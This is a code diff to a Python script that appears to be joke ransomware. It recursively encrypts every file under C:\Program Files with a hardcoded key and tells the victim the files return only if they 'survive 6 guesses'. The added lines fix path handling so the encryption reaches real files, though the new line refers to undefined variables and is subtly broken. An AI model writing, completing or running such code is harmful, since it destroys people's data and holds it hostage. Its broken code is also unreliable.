@@ -55,8 +55,9 @@ rootdir = 'C:\\Program Files\\'
 
 for subdir, dirs, files in os.walk(rootdir):
     for aFile in files:
-        
-        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", aFile, None, 64*1024)
+        filename = os.path.join(root, filename)
+
+        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
 
 
 
@@ -68,6 +69,5 @@ print("You have to survive 6 guesses")
 print("Also all the files on your computer are now encrypted, meaning that if you")
 print(" exit this program you will not get any of your files back.")
 print("If you survive they will be decrypted")
-
 
 
